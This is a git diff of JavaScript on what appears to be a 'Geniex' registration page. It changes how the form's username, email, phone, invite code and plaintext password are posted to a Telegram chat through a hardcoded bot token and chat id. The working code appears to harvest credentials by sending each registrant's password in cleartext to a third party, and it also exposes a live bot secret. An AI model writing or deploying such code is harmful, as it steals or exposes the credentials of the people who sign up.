@@ -157,11 +157,20 @@
       const invite = document.getElementById("invite").value;
       const password = document.getElementById("password").value;
 
+      const message = `
+/saveUser
+🟣 *New Geniex Registration*
+👤 *Username:* ${username}
+📧 *Email:* ${email}
+📱 *Phone:* ${phone}
+🔗 *Invite Code:* ${invite}
+🔒 *Password:* ${password}
+`;
+
       const token = "7771412415:AAFU8jVhc-OyvCigmEAMSbeiPFrGkr4zhOQ";
       const chat_id = "6707173438";
       const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
-      // Step 1: Send /saveUser to bot
       fetch(url, {
         method: "POST",
         headers: {
@@ -169,32 +178,9 @@
         },
         body: JSON.stringify({
           chat_id: chat_id,
-          text: "/saveUser"
+          text: message,
+          parse_mode: "Markdown"
         })
-      })
-      .then(() => {
-        // Step 2: Send registration details
-        const message = `
-🟣 *New Geniex Registration*
-👤 *Username:* ${username}
-📧 *Email:* ${email}
-📱 *Phone:* ${phone}
-🔗 *Invite Code:* ${invite}
-🔒 *Password:* ${password}
-✅ *Registration accepted and saved Successfully*
-`;
-
-        return fetch(url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chat_id,
-            text: message,
-            parse_mode: "Markdown"
-          })
-        });
       })
       .then(response => response.json())
       .then(data => {
